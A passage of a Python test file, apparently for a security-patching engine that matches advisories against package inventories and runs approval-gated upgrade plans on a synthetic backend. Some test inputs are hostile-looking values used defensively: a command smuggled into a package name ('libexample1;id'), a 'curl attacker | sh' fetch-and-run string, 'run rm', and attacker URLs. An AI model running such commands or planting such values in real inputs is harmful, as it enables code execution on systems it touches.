"""Engine contract tests with a protocol-conforming, disposable synthetic backend.

This fake never calls native package tools, inventories the host, or fetches a
network source. Its locks and gate files protect only TemporaryDirectory state.
"""

from contextlib import contextmanager
import copy
import fcntl
import hashlib
import os
from pathlib import Path
import re
import sqlite3
import tempfile
import threading
import unittest
from unittest.mock import patch

from autoprotect.core import AutoprotectError, BackendError, IndeterminateError, PolicyError, ValidationError, canonical, digest, load_json
from autoprotect.engine import Engine, validate_policy
from autoprotect.inventory import normalize_inventory
from autoprotect.store import Store


ORIGIN = {"origin": "Ubuntu", "label": "Ubuntu", "archive": "noble-security", "codename": "noble",
          "component": "main", "site": "security.ubuntu.com"}


def policy(mode="manual", backend="simulator"):
    return {"schema_version": 1, "mode": mode, "backend": backend,
            "allowed_assets": ["fixture-host"], "allowed_packages": ["libexample1"],
            "allowed_origins": [] if backend == "simulator" else [ORIGIN],
            "approved_config_digest": None if backend == "simulator" else "c" * 64,
            "max_inventory_age": 300, "max_feed_age": 300, "max_repository_age": 300,
            "plan_ttl": 200, "approval_ttl": 100, "allow_maintainer_scripts": backend != "simulator",
            "recovery_confirmed": backend != "simulator", "trusted_installed_lineage": backend != "simulator"}


def inventory(at=1000):
    return {"schema_version": 1, "asset_id": "fixture-host", "observed_at": at, "os": "ubuntu", "release": "noble",
            "architecture": "amd64", "complete": True, "collector": "simulator", "packages": [
                {"ecosystem": "deb", "name": "libexample1", "version": "1:1.0-1+b1", "source_name": "example-source",
                 "source_version": "1:1.0-1", "architecture": "amd64", "status": "installed", "held": False},
                {"ecosystem": "deb", "name": "unrelated", "version": "2.0-1", "source_name": "unrelated",
                 "source_version": "2.0-1", "architecture": "amd64", "status": "installed", "held": False},
            ]}


def target():
    return {"name": "libexample1", "architecture": "amd64", "from_version": "1:1.0-1+b1", "to_version": "1:1.0-1+ubuntu0.24.04.1+b1",
            "source_name": "example-source", "source_version": "1:1.0-1+ubuntu0.24.04.1", "sha256": "a" * 64, "size": 100,
            "origins": [ORIGIN], "config_digest": "c" * 64, "metadata_digest": "d" * 64}


def source(description="Synthetic advisory"):
    return canonical({"10001-1": {"id": "10001-1", "description": description,
        "cves": ["CVE-2026-10001"], "releases": {"noble": {
            "sources": {"example-source": {"version": "1:1.0-1+ubuntu0.24.04.1"}},
            "allbinaries": {"libexample1": {"source": "example-source",
                "version": "1:1.0-1+ubuntu0.24.04.1", "pocket": "security"}}}}}})


class SyntheticBackend:
    name = "simulator"

    def __init__(self, root, clock):
        self.path = Path(root) / "synthetic-state.json"
        self.gate = Path(root) / "synthetic-gate.json"
        self.generation_path = Path(root) / "synthetic-generation"
        self.lock_path = Path(root) / "synthetic-lock"
        self.clock = clock
        self.target = target()
        self.calls = []
        self.failure = None
        self.on_download = None
        self.after_callback = None
        self.on_begin = None
        self.on_finish = None
        self.post_change = None
        self.callback = True
        self.write = True
        self.locked = False
        self.recovery = False
        self.inspect_failure = False
        if not self.path.exists():
            self.path.write_text(canonical(inventory()), encoding="ascii")

    def inspect(self):
        self.calls.append("inspect")
        if self.inspect_failure:
            raise BackendError("Synthetic observation unavailable")
        data = load_json(self.path.read_bytes())
        data["observed_at"] = self.clock()
        return normalize_inventory(data, collector="native" if self.name == "ubuntu-apt" else "simulator")

    def generation(self):
        value = self.generation_path.read_text(encoding="ascii") if self.generation_path.exists() else "0" * 64
        if not re.fullmatch(r"[0-9a-f]{64}", value):
            raise BackendError("Synthetic generation is malformed")
        return value

    def _gate_evidence(self):
        if not self.gate.exists():
            return None
        raw = self.gate.read_bytes()
        if len(raw) > 4096:
            raise BackendError("Synthetic gate exceeds its inspection bound")
        try:
            value = load_json(raw, max_bytes=4096)
            if type(value) is dict and set(value) == {"plan_id"} and isinstance(value["plan_id"], str) and re.fullmatch(r"[0-9a-f]{64}", value["plan_id"]):
                return value
        except ValidationError:
            pass
        return {"malformed": True, "digest": hashlib.sha256(raw).hexdigest()}

    def resolve(self, inventory, finding, policy):
        self.calls.append("resolve")
        return copy.deepcopy(self.target)

    @contextmanager
    def lock(self, asset_id, *, recovery=False):
        assert asset_id == "fixture-host"
        with self.lock_path.open("a+") as handle:
            try:
                fcntl.flock(handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except BlockingIOError as exc:
                raise BackendError("Synthetic target is locked") from exc
            try:
                if self.gate.exists() and not recovery:
                    raise BackendError("Synthetic unresolved execution gate requires explicit recovery")
                self.locked, self.recovery = True, recovery
                self.calls.append("recovery-lock" if recovery else "lock")
                yield self._gate_evidence()
            finally:
                self.locked, self.recovery = False, False
                fcntl.flock(handle, fcntl.LOCK_UN)
                self.calls.append("unlock")

    def _flush_directory(self):
        descriptor = os.open(self.gate.parent, os.O_RDONLY | os.O_DIRECTORY)
        try:
            os.fsync(descriptor)
        finally:
            os.close(descriptor)

    def begin(self, plan_id):
        assert self.locked and not self.recovery
        assert not self.gate.exists()
        with self.gate.open("x") as handle:
            handle.write(canonical({"plan_id": plan_id}))
            handle.flush()
            os.fsync(handle.fileno())
        self._flush_directory()
        self.calls.append("begin")
        if self.on_begin:
            self.on_begin()

    def cancel(self, plan_id):
        assert self.locked and not self.recovery and "apply" not in self.calls
        assert load_json(self.gate.read_bytes())["plan_id"] == plan_id
        self.gate.unlink()
        self._flush_directory()
        self.calls.append("cancel")

    def finish(self, plan_id, outcome):
        assert self.locked
        assert load_json(self.gate.read_bytes())["plan_id"] == plan_id
        self.calls.append("finish:" + outcome)
        if self.on_finish:
            self.on_finish()
        if outcome in ("failed", "succeeded"):
            self.gate.unlink()
            self._flush_directory()

    def clear_gate(self, plan_id, resolution, *, malformed_digest=None):
        assert self.locked and self.recovery and resolution
        gate = self._gate_evidence()
        if gate is None or ("plan_id" in gate and (gate["plan_id"] != plan_id or malformed_digest is not None)):
            raise BackendError("Exact synthetic gate does not match the requested prior plan")
        if "malformed" in gate and (malformed_digest is None or malformed_digest != gate["digest"]):
            raise BackendError("Malformed synthetic gate needs its exact explicit digest")
        generation = digest({"previous": self.generation(), "gate": gate, "reason": resolution})
        temporary = self.generation_path.with_suffix(".new")
        with temporary.open("w") as handle:
            handle.write(generation)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(temporary, self.generation_path)
        self._flush_directory()
        self.gate.unlink()
        self._flush_directory()
        self.calls.append("clear-gate")

    def apply(self, target, policy, *, before_mutation):
        assert self.locked and self.gate.exists()
        self.calls.append("apply")
        if self.failure == "before":
            raise BackendError("Synthetic confirmed download failure; secret/raw output not for audit")
        if self.failure == "interrupt-before":
            raise KeyboardInterrupt
        if self.failure == "unknown":
            raise RuntimeError("Unknown backend fault")
        if self.on_download:
            self.on_download()
        if self.callback:
            self.calls.append("before-mutation")
            before_mutation()
        if self.after_callback:
            self.after_callback()
        if self.write:
            data = self.inspect()
            data["packages"][0].update(version=target["to_version"], source_version=target["source_version"])
            if self.post_change:
                self.post_change(data)
            self.path.write_text(canonical(data), encoding="ascii")
            self.calls.append("write")
        if self.failure == "after":
            raise IndeterminateError("Synthetic uncertain installation outcome")
        if self.failure == "interrupt-after":
            raise KeyboardInterrupt
        if self.failure == "inspection":
            self.inspect_failure = True
        return {"status": "succeeded", "untrusted_backend_detail": "not persisted"}


class PolicyTests(unittest.TestCase):
    def test_valid_manual_auto_observe_native_and_detached_values(self):
        for mode in ("manual", "auto", "observe"):
            for backend in ("simulator", "ubuntu-apt"):
                value = policy(mode, backend)
                validated = validate_policy(value)
                validated["allowed_assets"].append("other")
                self.assertEqual(value["allowed_assets"], ["fixture-host"])

    def test_every_missing_or_unknown_policy_field_rejected(self):
        for field in policy():
            with self.subTest(field=field):
                data = policy()
                del data[field]
                with self.assertRaises(ValidationError):
                    validate_policy(data)
        with self.assertRaises(ValidationError):
            validate_policy({**policy(), "trusted": True})

    def test_strict_policy_types_identities_durations_and_assertions(self):
        cases = {"schema_version": [True, 0, 2, "1"], "mode": [None, True, "automatic", []],
                 "backend": [None, "shell", {}], "allowed_assets": [[], "fixture-host", ["*"], ["evil\n"], [1]],
                 "allowed_packages": [[], ["libexample1;id"], ["--help"], ["libexample1", "libexample1"]],
                 "allowed_origins": [{}, [None]], "approved_config_digest": [False, "C" * 64, "bad"]}
        for field in ("max_inventory_age", "max_feed_age", "max_repository_age", "plan_ttl", "approval_ttl"):
            cases[field] = [True, 0, -1, 31_536_001, 1.5, "100"]
        for field in ("allow_maintainer_scripts", "recovery_confirmed", "trusted_installed_lineage"):
            cases[field] = [0, 1, "true", None]
        for field, values in cases.items():
            for value in values:
                with self.subTest(field=field, value=value), self.assertRaises(ValidationError):
                    validate_policy({**policy(), field: value})

    def test_native_origins_and_configuration_are_exact(self):
        for change in ({"allowed_origins": []}, {"approved_config_digest": None},
                       {"allowed_origins": [{**ORIGIN, "codename": "stable"}]},
                       {"allowed_origins": [{**ORIGIN, "codename": "noble-security"}]},
                       {"allowed_origins": [{**ORIGIN, "origin": "ThirdParty"}]},
                       {"allowed_origins": [{**ORIGIN, "label": "UbuntuESM"}]},
                       {"allowed_origins": [{**ORIGIN, "archive": "noble-apps-security"}]},
                       {"allowed_origins": [{**ORIGIN, "archive": "noble-backports"}]},
                       {"allowed_origins": [{**ORIGIN, "trusted": True}]},
                       {"allowed_origins": [{**ORIGIN, "site": "good\nInjected"}]},
                       {"allowed_origins": [ORIGIN, ORIGIN]}):
            with self.subTest(change=change), self.assertRaises(ValidationError):
                validate_policy({**policy(backend="ubuntu-apt"), **change})


class EngineTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.at = 1000
        self.policy = policy()
        self.loads = 0
        self.store = Store(Path(self.temp.name) / "main.db")
        self.addCleanup(self.store.close)
        self.backend = SyntheticBackend(self.temp.name, lambda: self.at)
        self.response = {"not_modified": False, "raw": source(), "etag": '"first"'}
        self.fetch_calls = []
        self.engine = Engine(self.store, self.provider, self.backend, clock=lambda: self.at, fetcher=self.fetch)

    def provider(self):
        self.loads += 1
        return copy.deepcopy(self.policy)

    def fetch(self, source, etag=None):
        self.fetch_calls.append((source, etag))
        if isinstance(self.response, BaseException):
            raise self.response
        return copy.deepcopy(self.response)

    def test_source_decoding_uses_shared_source_specific_limits(self):
        from autoprotect import core, feeds
        for name, raw, byte_limit, nodes in (
                ("ubuntu", source(), 512 * 1024 * 1024, 32_000_000),
                ("pwn", canonical({"incidents": []}), 8 * 1024 * 1024, 8_000_000)):
            for operation in ("import", "poll"):
                with self.subTest(source=name, operation=operation), \
                        patch("autoprotect.feeds.load_json", wraps=core.load_json) as decode:
                    self.response = {"not_modified": False, "raw": raw, "etag": None}
                    result = self.engine.ingest(name, raw) if operation == "import" else self.engine.poll(name)
                    self.assertIsNone(result["error"])
                    decode.assert_called_once_with(raw, max_bytes=byte_limit, max_nodes=nodes, max_depth=32)

    def test_scaled_source_limits_fail_closed_for_import_and_poll(self):
        for limit in ("bytes", "nodes"):
            for operation in ("import", "poll"):
                with self.subTest(limit=limit, operation=operation):
                    self.engine.ingest("ubuntu", source())
                    before = self.store.source_health("ubuntu")["snapshot_id"]
                    self.response = {"not_modified": False, "raw": source("changed"), "etag": None}
                    boundary = (patch.dict("autoprotect.feeds._BYTE_LIMITS", {"ubuntu": 10})
                                if limit == "bytes" else patch("autoprotect.feeds._MAX_UBUNTU_NODES", 2))
                    with boundary:
                        if operation == "import":
                            with self.assertRaises(ValidationError):
                                self.engine.ingest("ubuntu", source("changed"))
                        else:
                            self.assertIsNotNone(self.engine.poll("ubuntu")["error"])
                    health = self.store.source_health("ubuntu")
                    self.assertEqual(health["snapshot_id"], before)
                    self.assertIsNotNone(health["error"])

    def prepare(self, *, approve=True, poll=False):
        self.engine.poll("ubuntu") if poll else self.engine.ingest("ubuntu", source())
        self.engine.inventory()
        finding = next(row for row in self.engine.triage("fixture-host") if row["status"] == "affected")
        plan = self.engine.plan(finding["id"])
        if approve:
            plan = self.engine.approve(plan["id"], "operator")
        return plan

    def second_engine(self):
        store = Store(Path(self.temp.name) / "second.db")
        self.addCleanup(store.close)
        backend = SyntheticBackend(self.temp.name, lambda: self.at)
        engine = Engine(store, self.provider, backend, clock=lambda: self.at, fetcher=self.fetch)
        return store, backend, engine

    def test_manual_happy_path_envelopes_full_verification_and_final_non_rerun(self):
        plan = self.prepare()
        self.assertEqual(set(plan), {"id", "body", "status"})
        self.assertEqual(plan["status"], "approved")
        self.assertEqual(plan["id"], digest(plan["body"]))
        result = self.engine.execute(plan["id"])
        self.assertEqual(set(result), {"plan_id", "status", "result", "inventory_id"})
        self.assertEqual(result["status"], "succeeded")
        self.assertTrue(result["result"]["verified"])
        self.assertIsNotNone(result["inventory_id"])
        self.assertFalse(self.backend.gate.exists())
        self.assertEqual(self.engine.queue()[0]["status"], "succeeded")
        findings = self.engine.triage("fixture-host")
        self.assertEqual(next(r for r in findings if r["advisory_ids"])["status"], "not_affected")
        self.assertTrue(any(row["status"] == "unknown" for row in findings))
        with self.assertRaises(PolicyError):
            self.engine.execute(plan["id"])
        self.assertEqual(self.backend.calls.count("apply"), 1)
        self.assertNotIn("untrusted_backend_detail", canonical(result))
        self.assertGreaterEqual(self.loads, 10)
        audit = self.engine.audit()
        self.assertLess(next(i for i, row in enumerate(audit) if row["event"] == "execution-start"),
                        next(i for i, row in enumerate(audit) if row["event"] == "execution-outcome"))
        self.assertFalse(next(row for row in audit if row["event"] == "plan-approved")["details"]["actor_is_authenticated"])

    def test_auto_happy_path_needs_no_approval(self):
        self.policy["mode"] = "auto"
        plan = self.prepare(approve=False)
        self.assertEqual(plan["status"], "pending")
        self.assertIsNone(self.store.approval(plan["id"]))
        self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")

    def test_manual_unapproved_and_observe_denials_leave_investigation_usable(self):
        plan = self.prepare(approve=False)
        with self.assertRaisesRegex(PolicyError, "approval"):
            self.engine.execute(plan["id"])
        self.policy["mode"] = "observe"
        finding = next(r for r in self.engine.triage("fixture-host") if r["status"] == "affected")
        observed = self.engine.plan(finding["id"])
        for action in (lambda: self.engine.approve(observed["id"], "op"), lambda: self.engine.execute(observed["id"])):
            with self.assertRaisesRegex(PolicyError, "Observe"):
                action()
        self.assertTrue(self.engine.export("fixture-host")["findings"])
        self.assertFalse(self.backend.gate.exists())
        self.assertNotIn("apply", self.backend.calls)
        self.assertEqual(sum(row["event"] == "action-denied" for row in self.engine.audit()), 3)

    def test_retention_keeps_plan_evidence_and_prunes_superseded_snapshots(self):
        plan = self.prepare()
        planned_source = plan["body"]["source_digest"]
        self.at += 1
        self.engine.ingest("ubuntu", source("Second snapshot"))
        self.at += 1
        third = self.engine.ingest("ubuntu", source("Third snapshot"))
        objects = {row[0] for row in self.store.connection.execute("SELECT id FROM objects WHERE kind='source'")}
        # The plan's evidence and the head survive; the unreferenced middle snapshot does not.
        self.assertEqual(objects, {planned_source, third["snapshot_id"]})
        self.assertEqual(self.store.finding(plan["body"]["finding_id"])["id"], plan["body"]["finding_id"])
        self.assertEqual(self.store.get("inventory", plan["body"]["inventory_id"])["asset_id"], "fixture-host")
        pruned = [row["details"] for row in self.engine.audit() if row["event"] == "evidence-pruned"]
        self.assertTrue(pruned and all(set(row) == {"source", "findings", "inventory"} for row in pruned))

    def test_repeated_triage_does_not_accumulate_findings_sets(self):
        self.engine.ingest("ubuntu", source())
        for _ in range(3):
            self.at += 1
            self.engine.inventory()
            self.engine.triage("fixture-host")
        count = self.store.connection.execute("SELECT COUNT(*) FROM objects WHERE kind='findings'").fetchone()[0]
        self.assertEqual(count, 1)
        inventories = self.store.connection.execute("SELECT COUNT(*) FROM objects WHERE kind='inventory'").fetchone()[0]
        self.assertEqual(inventories, 1)

    def test_triage_persists_only_plannable_findings_and_records_provenance(self):
        self.engine.ingest("ubuntu", source())
        self.engine.inventory()
        findings = self.engine.triage("fixture-host")
        affected = [row for row in findings if row["status"] == "affected"]
        self.assertTrue(affected and len(affected) < len(findings))
        self.assertTrue(all(row["evidence_acquisition"] == "import" for row in affected))
        stored = self.store.get("findings", self.store.connection.execute("SELECT id FROM objects WHERE kind='findings'").fetchone()[0])
        self.assertEqual(stored["findings"], affected)
        self.assertEqual(self.engine.poll("ubuntu")["acquisition"], "https")
        polled = self.engine.triage("fixture-host")
        self.assertTrue(all(row["evidence_acquisition"] == "https" for row in polled if row["advisory_ids"]))

    def test_poll_discards_a_response_when_the_head_changes_during_fetch(self):
        self.engine.poll("ubuntu")
        before = self.store.source_health("ubuntu")
        def fetch(source_name, etag=None):
            self.engine.ingest("ubuntu", source("Concurrent import"))
            return {"not_modified": False, "raw": source("Older poll response"), "etag": '"late"'}
        self.engine._fetcher = fetch
        with self.assertRaisesRegex(AutoprotectError, "changed during this poll"):
            self.engine.poll("ubuntu")
        head = self.store.source_health("ubuntu")
        self.assertEqual(head["acquisition"], "import")
        self.assertEqual(head["revision"], before["revision"] + 1)
        self.assertIsNone(head["error"])
        self.assertEqual(self.engine.audit()[-1]["details"]["reason"], "source head changed concurrently")

    def test_read_only_commands_do_not_wait_for_a_running_writer(self):
        self.prepare()
        other = Store(Path(self.temp.name) / "main.db")
        self.addCleanup(other.close)
        with other.transaction():
            other.event(self.at, "synthetic-writer", {})
            self.assertTrue(self.engine.queue())
            self.assertTrue(self.engine.audit())

    def test_pre_grouping_plans_and_findings_become_stale_not_errors(self):
        plan = self.prepare()
        legacy = {key: value for key, value in plan["body"].items() if key != "advisory_ids"}
        legacy["advisory_id"] = plan["body"]["advisory_ids"][0]
        with self.store.transaction():
            legacy_plan = self.store.save_plan(legacy)["id"]
            row = {"asset_id": "fixture-host", "status": "affected", "advisory_id": "CVE-2026-10001"}
            row = {"id": digest(row), **row}
            self.store.save_findings({"inventory_id": None, "source_digest": None, "findings": [row]})
        with self.assertRaisesRegex(PolicyError, "predates"):
            self.engine.approve(legacy_plan, "operator")
        self.assertEqual(self.store.plan(legacy_plan)["status"], "stale")
        with self.assertRaisesRegex(PolicyError, "predates"):
            self.engine.plan(row["id"])

    def test_static_policy_snapshot_is_rejected(self):
        with self.assertRaisesRegex(ValidationError, "callable"):
            Engine(self.store, self.policy, self.backend)

    def test_import_provenance_arguments_and_bodies_cannot_spoof_https(self):
        for kwargs in ({"acquisition": "https"}, {"acquisition": "native"}, {"etag": '"trusted"'}):
            with self.subTest(kwargs=kwargs), self.assertRaises(ValidationError):
                self.engine.ingest("pwn", '{"incidents":[]}', **kwargs)
        for body in ({"incidents": [], "acquisition": "https"}, {"incidents": [], "provenance": {"trusted": True}}):
            with self.assertRaises(ValidationError):
                self.engine.ingest("pwn", canonical(body))
        result = self.engine.ingest("pwn", '{"incidents":[],"trusted":true,"url":"https://attacker.invalid"}')
        self.assertEqual(result["acquisition"], "import")
        self.assertIsNone(result["endpoint"])
        for invalid in ("https://attacker.invalid", "ubuntu\n", [], None):
            with self.assertRaises(ValidationError):
                self.engine.poll(invalid)
        self.assertEqual(self.fetch_calls, [])

    def test_import_dedup_and_poll_provenance_cannot_be_overwritten(self):
        imported = self.engine.ingest("ubuntu", source())
        self.at += 1
        same = self.engine.ingest("ubuntu", source())
        self.assertEqual(imported["snapshot_id"], same["snapshot_id"])
        https = self.engine.poll("ubuntu")
        self.assertNotEqual(https["snapshot_id"], imported["snapshot_id"])
        # The replaced import is unreferenced evidence, so it is pruned and audited.
        with self.assertRaisesRegex(ValidationError, "does not exist"):
            self.store.get("source", imported["snapshot_id"])
        self.assertTrue(any(row["event"] == "evidence-pruned" for row in self.engine.audit()))
        again = self.engine.ingest("ubuntu", source())
        self.assertEqual(again["snapshot_id"], imported["snapshot_id"])
        self.assertIsNone(again["etag"])
        with self.assertRaisesRegex(ValidationError, "does not exist"):
            self.store.get("source", https["snapshot_id"])

    def test_304_requires_same_source_https_snapshot_and_refreshes_only_contact(self):
        self.response = {"not_modified": True, "raw": None, "etag": '"first"'}
        missing = self.engine.poll("ubuntu")
        self.assertIsNotNone(missing["error"])
        self.assertIsNone(missing["last_success"])
        self.engine.ingest("ubuntu", source())
        rejected = self.engine.poll("ubuntu")
        self.assertIsNotNone(rejected["error"])
        self.response = {"not_modified": False, "raw": source(), "etag": '"first"'}
        good = self.engine.poll("ubuntu")
        body = self.store.get("source", good["snapshot_id"])
        self.at += 20
        self.response = {"not_modified": True, "raw": None, "etag": None}
        result = self.engine.poll("ubuntu")
        self.assertEqual(result["snapshot_id"], good["snapshot_id"])
        self.assertEqual(result["last_success"], self.at)
        self.assertEqual(result["etag"], '"first"')
        self.assertEqual(body, self.store.get("source", good["snapshot_id"]))
        self.assertEqual(self.fetch_calls[-1], ("ubuntu", '"first"'))
        self.assertIsNotNone(self.engine.poll("pwn")["error"])
        self.assertEqual(self.fetch_calls[-1], ("pwn", None))

    def test_poll_failure_and_parse_failure_preserve_good_data_and_error_is_bounded(self):
        good = self.engine.poll("ubuntu")
        for failure in (RuntimeError("secret" * 10000), {"not_modified": False, "raw": "{", "etag": '"bad"'},
                        {"not_modified": False, "raw": source(), "etag": "header\ninjection"},
                        {"not_modified": 1, "raw": source(), "etag": None}):
            self.at += 1
            self.response = failure
            result = self.engine.poll("ubuntu")
            self.assertEqual(result["snapshot_id"], good["snapshot_id"])
            self.assertEqual(result["last_success"], good["last_success"])
            self.assertEqual(result["etag"], good["etag"])
            self.assertEqual(result["last_attempt"], self.at)
            self.assertNotIn("secret", canonical(result))
        self.response = {"not_modified": True, "raw": None, "etag": '"first"'}
        self.assertIsNone(self.engine.poll("ubuntu")["error"])

    def test_poll_failure_after_head_write_rolls_back_success_before_recording_error(self):
        good = self.engine.poll("ubuntu")
        self.at += 1
        self.response["raw"] = source("Changed source awaiting committed acquisition")
        original = self.store.event
        def event(at, name, details):
            if name == "source-poll":
                raise sqlite3.OperationalError("Synthetic failed acquisition audit write")
            original(at, name, details)
        with patch.object(self.store, "event", event):
            failed = self.engine.poll("ubuntu")
        self.assertEqual(failed["snapshot_id"], good["snapshot_id"])
        self.assertEqual(failed["last_success"], good["last_success"])
        self.assertEqual(failed["last_attempt"], self.at)
        self.assertIsNotNone(failed["error"])

    def test_import_parse_failure_records_health_without_replacing_snapshot(self):
        good = self.engine.ingest("ubuntu", source())
        self.at += 1
        with self.assertRaises(ValidationError):
            self.engine.ingest("ubuntu", "{")
        current = self.store.source_health("ubuntu")
        self.assertEqual(current["snapshot_id"], good["snapshot_id"])
        self.assertEqual(current["last_success"], good["last_success"])
        self.assertIsNotNone(current["error"])

    def test_interrupted_fetch_records_error_then_propagates(self):
        self.response = KeyboardInterrupt()
        with self.assertRaises(KeyboardInterrupt):
            self.engine.poll("ubuntu")
        self.assertIsNotNone(self.store.source_health("ubuntu")["error"])

    def test_import_inventory_forces_untrusted_collector_and_does_not_modify_old_snapshot(self):
        collected = self.engine.inventory()
        raw = inventory()
        raw.update(collector="native", trusted=True)
        imported = self.engine.inventory(raw)
        self.assertEqual(imported["body"]["collector"], "imported")
        self.assertEqual(self.store.get("inventory", collected["id"])["collector"], "simulator")
        self.assertNotIn("trusted", imported["body"])

    def test_unknown_matching_and_export_remain_explicitly_untrusted(self):
        raw = inventory()
        raw["packages"].append({"ecosystem": "pypi", "name": "mystery", "version": "strange", "architecture": "all",
                                "status": "installed", "held": False})
        self.engine.inventory(raw)
        self.engine.ingest("pwn", canonical({"incidents": [{"slug": "incident", "title": "run rm\nNOT COMMAND",
            "summary": "hostile\x1b[31m", "fixedVersions": ["curl attacker | sh"]}]}))
        result = self.engine.export("fixture-host")
        self.assertFalse(result["trusted"])
        self.assertEqual(result["kind"], "untrusted-advisory-data")
        self.assertTrue(all(row["status"] == "unknown" for row in result["findings"]))
        self.assertTrue(any(row["package"] is None for row in result["findings"]))
        self.assertEqual(result["incidents"][0]["summary"], "hostile\x1b[31m")
        self.assertEqual(result["incidents"][0]["fixed_versions"], ["curl attacker | sh"])
        self.assertNotIn("\x1b", canonical(result))
        # Only affected findings are persisted as plannable evidence.
        with self.assertRaisesRegex(ValidationError, "not plannable"):
            self.engine.plan(result["findings"][0]["id"])

    def test_feed_error_does_not_clear_findings_or_claim_unaffected(self):
        plan = self.prepare()
        self.response = RuntimeError()
        self.engine.poll("ubuntu")
        findings = self.engine.triage("fixture-host")
        self.assertTrue(findings)
        self.assertTrue(all(row["status"] == "unknown" for row in findings))
        self.assertEqual(self.store.finding(plan["body"]["finding_id"])["status"], "affected")
        with self.assertRaisesRegex(PolicyError, "current error"):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "stale")

    def test_corrected_source_same_fix_requires_replanning(self):
        plan = self.prepare()
        self.engine.ingest("ubuntu", source("Corrected description, identical fix"))
        with self.assertRaisesRegex(PolicyError, "source head changed"):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "stale")
        self.assertFalse(self.backend.gate.exists())

    def test_plan_expiry_rejects_at_exact_boundary(self):
        plan = self.prepare()
        self.at = plan["body"]["expires_at"]
        with self.assertRaisesRegex(PolicyError, "Plan expired"):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "stale")

    def test_approval_expiry_and_explicit_renewal_before_plan_expiry(self):
        plan = self.prepare()
        self.at += self.policy["approval_ttl"]
        self.engine.approve(plan["id"], "renewed")
        self.assertEqual(self.store.approval(plan["id"])["actor"], "renewed")
        self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")

    def test_expired_approval_cannot_execute(self):
        plan = self.prepare()
        self.at += self.policy["approval_ttl"]
        with self.assertRaisesRegex(PolicyError, "Approval expired"):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "stale")

    def test_stale_or_future_inventory_and_feed_block_execution(self):
        for field in ("max_inventory_age", "max_feed_age"):
            with self.subTest(field=field):
                self.policy[field] = 10
                plan = self.prepare()
                self.at += 11
                with self.assertRaises(PolicyError):
                    self.engine.execute(plan["id"])
                self.assertEqual(self.store.plan(plan["id"])["status"], "stale")
                self.policy[field] = 300
        self.at -= 100
        with self.assertRaises(PolicyError):
            self.engine.plan(plan["body"]["finding_id"])

    def test_changed_policy_inventory_and_artifact_invalidate_approval(self):
        plan = self.prepare()
        self.policy["allowed_packages"].append("other")
        with self.assertRaisesRegex(PolicyError, "Policy changed"):
            self.engine.execute(plan["id"])
        plan = self.prepare()
        changed = self.backend.inspect()
        changed["packages"][1]["version"] = "3.0-1"
        self.backend.path.write_text(canonical(changed))
        self.engine.inventory()
        with self.assertRaisesRegex(PolicyError, "Inventory head"):
            self.engine.execute(plan["id"])
        plan = self.prepare()
        self.backend.target["sha256"] = "b" * 64
        with self.assertRaisesRegex(PolicyError, "artifact"):
            self.engine.execute(plan["id"])
        self.assertNotIn("apply", self.backend.calls)

    def test_new_observation_timestamp_with_same_full_fingerprint_is_allowed(self):
        plan = self.prepare()
        self.at += 10
        new = self.engine.inventory()
        self.assertNotEqual(new["id"], plan["body"]["inventory_id"])
        self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")

    def test_native_requires_https_native_collection_and_live_assertions(self):
        self.backend.name = "ubuntu-apt"
        self.policy = policy(backend="ubuntu-apt")
        self.engine.ingest("ubuntu", source())
        self.engine.inventory()
        finding = next(r for r in self.engine.triage("fixture-host") if r["status"] == "affected")
        with self.assertRaisesRegex(PolicyError, "poll"):
            self.engine.plan(finding["id"])
        self.engine.poll("ubuntu")
        self.engine.inventory(inventory())
        finding = next(r for r in self.engine.triage("fixture-host") if r["status"] == "affected")
        with self.assertRaisesRegex(PolicyError, "native inventory"):
            self.engine.plan(finding["id"])
        self.engine.inventory()
        self.policy["trusted_installed_lineage"] = False
        finding = next(r for r in self.engine.triage("fixture-host") if r["status"] == "affected")
        with self.assertRaisesRegex(PolicyError, "assertions"):
            self.engine.plan(finding["id"])
        self.policy["trusted_installed_lineage"] = True
        plan = self.engine.plan(finding["id"])
        self.engine.approve(plan["id"], "operator")
        self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")

    def test_native_target_wrong_configuration_or_origin_is_rejected(self):
        self.backend.name = "ubuntu-apt"
        self.policy = policy(backend="ubuntu-apt")
        self.engine.poll("ubuntu")
        self.engine.inventory()
        finding = next(r for r in self.engine.triage("fixture-host") if r["status"] == "affected")
        for key, value in (("config_digest", "b" * 64), ("origins", [{**ORIGIN, "site": "attacker.invalid"}])):
            self.backend.target = {**target(), key: value}
            with self.assertRaisesRegex(PolicyError, "not approved"):
                self.engine.plan(finding["id"])

    def test_allowlist_holds_and_malformed_targets_fail_before_gate(self):
        self.policy["allowed_packages"] = ["other"]
        with self.assertRaises(PolicyError):
            self.prepare()
        self.policy = policy()
        for key, value in (("to_version", "0.1"), ("source_version", "0.1"), ("name", "other"),
                           ("sha256", "bad"), ("size", True), ("command", "arbitrary")):
            self.backend.target = {**target(), key: value}
            with self.subTest(key=key), self.assertRaises((PolicyError, ValidationError)):
                self.prepare()
        self.backend.target = target()
        changed = self.backend.inspect()
        changed["packages"][0]["held"] = True
        self.backend.path.write_text(canonical(changed))
        with self.assertRaisesRegex(PolicyError, "unheld"):
            self.prepare()
        self.assertFalse(self.backend.gate.exists())

    def corrupt(self, key):
        self.store.connection.execute("DROP TRIGGER IF EXISTS immutable_objects_update")
        self.store.connection.execute("UPDATE objects SET body='{}' WHERE id=?", (key,))

    def test_corrupt_immutable_source_inventory_finding_plan_and_approval_block_execution(self):
        # Each kind is tested with an isolated valid candidate.
        for kind in ("source", "inventory", "findings", "plan", "approval"):
            with self.subTest(kind=kind), tempfile.TemporaryDirectory() as directory:
                with Store(Path(directory) / "test.db") as store:
                    backend = SyntheticBackend(directory, lambda: self.at)
                    engine = Engine(store, self.provider, backend, clock=lambda: self.at)
                    engine.ingest("ubuntu", source())
                    engine.inventory()
